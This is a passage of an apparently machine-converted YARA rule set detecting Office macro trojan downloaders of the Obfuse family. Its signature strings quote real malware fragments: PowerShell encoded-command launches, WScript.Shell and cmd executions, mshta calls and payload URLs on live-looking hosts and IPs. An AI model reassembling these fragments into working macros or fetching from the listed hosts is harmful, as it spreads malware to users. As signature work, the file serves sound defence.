        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 28 [0-3] 29 20 26 20 22 2e 22 20 26 20 [0-16] 28 [0-3] 29 20 26 20 22 72 65 71 75 65 73 74 2e 35 2e 31 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-16] 28 [0-16] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 57 72 69 74 65 20 [0-16] 2e 72 65 73 70 6f 6e 73 65 62 6f 64 79}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-16] 2c 20 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ORO_2147770243_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ORO!MTB"
        threat_id = "2147770243"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 [0-32] 28 42 79 56 61 6c 20 61 31 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 61 32 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 61 33 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 61 34 20 41 73 20 4c 6f 6e 67 29}  //weight: 1, accuracy: Low
        $x_1_2 = {61 31 2e 43 72 65 61 74 65 20 [0-21] 28 53 68 65 65 74 73 28 22 [0-32] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 2c 20 61 32 2c 20 61 33 2c 20 61 34}  //weight: 1, accuracy: Low
        $x_1_3 = {28 53 68 65 65 74 73 28 22 [0-32] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {44 69 6d 20 [0-32] 20 41 73 20 4f 62 6a 65 63 74 02 00 53 65 74 20 [0-32] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-32] 28 53 68 65 65 74 73 28 22 [0-32] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {28 53 68 65 65 74 73 28 22 [0-32] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 30 02 00 45 6e 64 20 53 75 62 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = {47 6f 54 6f 20 [0-66] 3a}  //weight: 1, accuracy: Low
        $x_1_7 = {47 6f 54 6f 20 [0-32] 45 78 69 74 20 46 75 6e 63 74 69 6f 6e [0-32] 3a}  //weight: 1, accuracy: Low
        $x_1_8 = {4d 73 67 42 6f 78 20 22 20 74 68 69 73 20 73 6f 6c 75 74 69 6f 6e 20 77 69 6c 6c 20 70 72 6f 76 69 64 65 20 6d 6f 64 75 6c 65 73 22 02 00 45 78 69 74 20 46 75 6e 63 74 69 6f 6e 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAN_2147770286_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAN!MTB"
        threat_id = "2147770286"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 [0-16] 28 [0-16] 2c 20 4f 70 74 69 6f 6e 61 6c 20 42 79 56 61 6c 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 73 79 73 74 65 6d 6f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_3 = {29 2e 65 78 65 63 20 28 [0-16] 28 [0-16] 29 20 26 20 22 20 22 20 26 20 65 76 57 6e 55 20 26 20 22 2c 53 68 6f 77 44 69 61 6c 6f 67 41 20 2d 72 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DRI_2147770393_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DRI!MTB"
        threat_id = "2147770393"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "& ChrW(CLng((Asc(\"d\")))) & ChrW(CLng((AscW(\"a\")))) & ChrW(CLng((Asc(\"t\"))))" ascii //weight: 1
        $x_1_2 = "= Join(Array(Chr(CLng((wdArtArchedScallops And ((wdDialogToolsUnprotectDocument + 372#) - 798#)))) & ChrW(CLng((wdDialogEditReplace And wdKeyP))) _" ascii //weight: 1
        $x_1_3 = "Asc(Left$(Mid$(GwkWt9YVeqfO, yHUIMzXkuBsJ)," ascii //weight: 1
        $x_1_4 = ".Create VMLruQSpfbGLlvyk, Null, fEoFu5dgZHt" ascii //weight: 1
        $x_1_5 = "+ Chr(CLng((wdKeyNumeric9 Xor wdTypeCustomPageNumberBottom)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KDU_2147771154_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KDU!MTB"
        threat_id = "2147771154"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "gKDUuwXyCfINsVL.mUQnXdwRxKLBASJ.ControlTipText = gKDUuwXyCfINsVL.SwtMebRBEsim.Tag" ascii //weight: 1
        $x_1_2 = "gKDUuwXyCfINsVL.HqMtgTpLnvEZkQA.ControlTipText = gKDUuwXyCfINsVL.PCBouOsZVaYk.Tag" ascii //weight: 1
        $x_1_3 = "gKDUuwXyCfINsVL.JOacyIvnZUMA.AutoSize = True" ascii //weight: 1
        $x_1_4 = "Shell gKDUuwXyCfINsVL.bHEStkQWdlsCmYpGPDcwNRUyn.Tag," ascii //weight: 1
        $x_1_5 = "MsgBox \"Document cannot be opened\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVB_2147771320_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVB!MTB"
        threat_id = "2147771320"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 34 29 29 2e 52 75 6e 20 22 22 20 26 20 28 [0-20] 20 2b 20 22 33 32 20 22 20 26 20 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c}  //weight: 1, accuracy: Low
        $x_1_2 = "Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_3 = "ListBox1.AddItem (\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-5] 22}  //weight: 1, accuracy: Low
        $x_1_5 = {73 74 61 74 75 73 2e [0-5] 2f 70 68 30 74 30 2e 6a 70 67}  //weight: 1, accuracy: Low
        $x_1_6 = "ListBox1.AddItem (\"ADODB.Stream\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ROF_2147771451_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ROF!MTB"
        threat_id = "2147771451"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 61 70 70 77 6f 72 64 2e 63 61 63 68 65 22 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_2 = " = CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_3 = "strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)" ascii //weight: 1
        $x_1_4 = {6c 6f 6e 67 53 74 72 69 6e 67 20 3d 20 6c 6f 6e 67 53 74 72 69 6e 67 20 26 20 22 [0-95] 3d 3d 22}  //weight: 1, accuracy: Low
        $x_1_5 = " = Decode64(longString)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAS_2147771590_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAS!MTB"
        threat_id = "2147771590"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Open \"GET\", \"http://\" & ListBox1.List(3), False" ascii //weight: 1
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 2e 64 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 4c 69 73 74 42 6f 78 31 2e 4c 69 73 74 28 34 29 29 2e 52 75 6e 20 22 22 20 26 20 28 [0-21] 20 2b 20 22 33 32 20 22 20 26 20 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 2e 64 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4c 69 73 74 42 6f 78 31 2e 41 64 64 49 74 65 6d 20 28 22 6c 6f 6e 67 [0-8] 2e [0-8] 2f 70 31 63 74 75 72 65 33 2e 6a 70 67 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 6f 72 20 69 20 3d 20 31 20 54 6f 20 4c 65 6e 28 [0-114] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_2 = {73 53 74 72 20 3d 20 73 53 74 72 20 2b 20 43 68 72 28 43 4c 6e 67 28 22 26 48 22 20 26 20 4d 69 64 28 [0-114] 2c 20 69 2c 20 32 29 29 20 2d 20 32 39 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell sStr" ascii //weight: 1
        $x_1_4 = "Private Sub asdas()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "c:\\programdata\\sds.hta" ascii //weight: 1
        $x_1_2 = {4f 70 65 6e 20 [0-10] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 0d 0a 50 72 69 6e 74 20 23 31 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 22 [0-10] 22 2c 20 22 22 29 0d 0a 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell#(\"cmd /c \" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "shea).exec(powerrange & \"hell -w \" & protei & " ascii //weight: 1
        $x_1_2 = "http://31.210.20.6/w2/Hoxmq.ex\" & Chr(101) & Chr(34)" ascii //weight: 1
        $x_1_3 = {26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Run(jMkUOSWtofK & HsQgOKMOa, 0, False)" ascii //weight: 1
        $x_1_2 = "tehzvacfynlk & Chr$(Val(\"&H\" & Mid$(vwvqvlajvmxs, hdjsjdpedare, 2)))" ascii //weight: 1
        $x_1_3 = "\"-w 1 -C \"\"sv xW -;sv PrZ ec;sv dyS ((gv xW).value.toString()+(gv PrZ).value.toString())" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URL = \"https://kithuatphanmem.000webhostapp.com/chare/test.zip" ascii //weight: 1
        $x_1_2 = "oShell.Run \"cmd.exe /c cd C:\\Users\\\" & User & \"\\Documents\\Test\\necoreapp3.1 && CookieVirus.exe\", 0, True" ascii //weight: 1
        $x_1_3 = "Application.ActiveDocument.InlineShapes.AddPicture _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VIS_2147771598_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VIS!MTB"
        threat_id = "2147771598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call Syndicate()" ascii //weight: 1
        $x_1_2 = "83), 103), 66), 66), 65), 69), 73), 65), 101), 81), 66), 66), 65), 69), 99), 65), 86), 81), 66), 66), 65), 71), 77), 65), 85), 81), 66), 66), 65), 71" ascii //weight: 1
        $x_1_3 = "99), 65), 81), 81), 66), 69), 65), 68), 65), 65), 81), 81), 66), 74), 65), 69), 69), 65), 81), 103), 66), 105), 65), 69), 69), 65), 82), 103), 66), 78)" ascii //weight: 1
        $x_1_4 = "65), 69), 69), 65), 90), 81), 66), 82), 65), 69), 73), 65), 101), 103), 66), 66), 65), 69), 103), 65), 85), 81), 66), 66), 65), 70), 111), 65), 85), 81)" ascii //weight: 1
        $x_1_5 = "ReDim bOut((((UBound(bIn) + 1) \\ 4) * 3) - 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_UB_2147771600_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.UB!MTB"
        threat_id = "2147771600"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "fcbcffecbdcbcbcbfeebbffddbdbda_cbbbcaaedd_acefefaecceabdcedfdebbccccefceafefecdbceacce.js" ascii //weight: 1
        $x_1_2 = "eefffcebbbebeabcdfbffdceaecaedbcaebeef_bcbbaaea_ebfcaebebedababdafaabadecaadaffadbfebcdfeeaaf.txt\", True" ascii //weight: 1
        $x_1_3 = "aeeebbddccfa.GetSpecialFolder(2);" ascii //weight: 1
        $x_1_4 = "caefaed.toString()" ascii //weight: 1
        $x_1_5 = {4d 61 74 68 2e 61 62 73 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_6 = ".length-1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAR_2147771695_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAR!MTB"
        threat_id = "2147771695"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell -noP -sta -w 1 -enc  UwBFAHQALQBWAGEAUg" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-8] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 52 75 6e 20 28 [0-6] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PMB_2147771742_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PMB!MTB"
        threat_id = "2147771742"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Chr(Asc(CurrentLetter) - Val(Mid(iKey, iKeyPos, 1)))" ascii //weight: 1
        $x_1_2 = "Function sacsa(sacxsaxsaa As String)" ascii //weight: 1
        $x_1_3 = "sopvd = \"WScript.\" + \"She\" + \"ll\"" ascii //weight: 1
        $x_1_4 = "Set WshShell = CreateObject(sopvd)" ascii //weight: 1
        $x_1_5 = "Shell sacxsaxsaa" ascii //weight: 1
        $x_1_6 = "Set WshShell = Nothing" ascii //weight: 1
        $x_1_7 = "'shell (x)" ascii //weight: 1
        $x_1_8 = "If Not Asc(CurrentLetter) + Len(iKey) > 255" ascii //weight: 1
        $x_1_9 = ";D\\jEtDJXD\\zE3DFDD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SR_2147771750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SR!MTB"
        threat_id = "2147771750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "kasodkok = \"tp://%748237%728748@j.mp/" ascii //weight: 2
        $x_1_2 = "jsadjjj = \"ajsda" ascii //weight: 1
        $x_1_3 = "kmmmmm = kasodkok + jsadjjj" ascii //weight: 1
        $x_1_4 = "nmnakwdj1 = \"s\"" ascii //weight: 1
        $x_1_5 = "nmnakwdj2 = \"h\"" ascii //weight: 1
        $x_1_6 = "nmnakwdj3 = \"t\" + \"a ht\"" ascii //weight: 1
        $x_6_7 = "n0t = \"ms\" + \"h\" + \"ta\" + \" ht\" + \"tp:/\" + \"/hot\" + \"elle\" + \"onar\" + \"doda\" + \"vi\" + \"nci.\" + \"cl/p\" + \"ng/p\" + \"0.h\" + \"ta" ascii //weight: 6
        $x_6_8 = "lora1 = \"tp://%748237%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748%728748@j.mp/" ascii //weight: 6
        $x_6_9 = "ht\" + \"tp:/\" + \"/hot\" + \"elle\" + \"onar\" + \"doda\" + \"vi\" + \"nci.\" + \"cl/p\" + \"ng/p\" + \"0.h\" + \"ta" ascii //weight: 6
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((1 of ($x_6_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_RVD_2147771752_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVD!MTB"
        threat_id = "2147771752"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WShell.run \"\"wscript.exe //B \"\" & Chr(34) & dir & \"\"rknrl.vbs\"\" & Chr(34):wspr = WShell.regread" ascii //weight: 1
        $x_1_2 = "VBSpath = gPath & \"\\rknrl.vbs\"" ascii //weight: 1
        $x_1_3 = "DMpath = gPath & \"\\DM6331.TMP\"" ascii //weight: 1
        $x_1_4 = "WShell = CreateObject(\"\"WScript.Shell\"\")" ascii //weight: 1
        $x_1_5 = "Replace(DM, \"\"\"\", \"\"\"\"\"\")" ascii //weight: 1
        $x_1_6 = "Wsc|rip|t.S|cri|ptF|ull|Nam|e).|Par|ent|Fol|der|.Pa|th&|\"\"\\|DM6|331|.TM|P\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AZ_2147772398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AZ!MTB"
        threat_id = "2147772398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "636D64202F63207363687461736B73202F72756E202F746E205C4D6963726F736F66745C57696E646F77735C4469736B436C65616E75705C53696C656E74436C65616E7570202F49" ascii //weight: 1
        $x_1_2 = "484B43555C456E7669726F6E6D656E745C77696E646972" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "275C64524C526D2E65786527293B53746172742D536C65657020323B2053746172742D50726F636573732024656E763A617070646174615C64524C526D2E6578653B2652454D" ascii //weight: 1
        $x_1_5 = "687474703A2F2F3231332E3232372E3135352E3135343A383038302F6578655F542E657865272C2824656E763A61707064617461292B" ascii //weight: 1
        $x_1_6 = ".RegDelete qwdwwxq(\"484B43555C456E7669726F6E6D656E745C77696E646972\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BUR_2147772434_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BUR!MTB"
        threat_id = "2147772434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function p4e1dEwtDO8XRgW() As Currency" ascii //weight: 1
        $x_1_2 = "Call znwCrl" ascii //weight: 1
        $x_1_3 = "Function biloo(burgerorgan, bonusshoot)" ascii //weight: 1
        $x_1_4 = "Function nio(burgerorgan, bonusshoot)" ascii //weight: 1
        $x_1_5 = "qoxnwkqnhfshhimr = \"*\" & burgerorgan & \"*\"" ascii //weight: 1
        $x_1_6 = "Dim be3a8c1f30f1abadd648e22b16fdb57d5 As Double" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ASC_2147772490_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ASC!MTB"
        threat_id = "2147772490"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Declare Function E2gz2Xkyudd Lib \"user32.dll\" Alias \"PostMessageA\" " ascii //weight: 1
        $x_1_2 = "Function P2zzn8wo80G3r()" ascii //weight: 1
        $x_1_3 = "P2zzn8wo80G3r = Join(Array(ChrW(CLng((Not -47))) & ChrW(CLng((" ascii //weight: 1
        $x_1_4 = "= Chr(CLng((AscW(\"w\")))) _" ascii //weight: 1
        $x_1_5 = "Set IyHklx0Y = GetObject(WvxB_hpc7).SpawnInstance_" ascii //weight: 1
        $x_1_6 = ".ShowWindow = CLng((0." ascii //weight: 1
        $x_1_7 = "Asc(Left$(Mid$(VDD9R_Qkl_IQl_0IuQ, T9hbIFRbky)," ascii //weight: 1
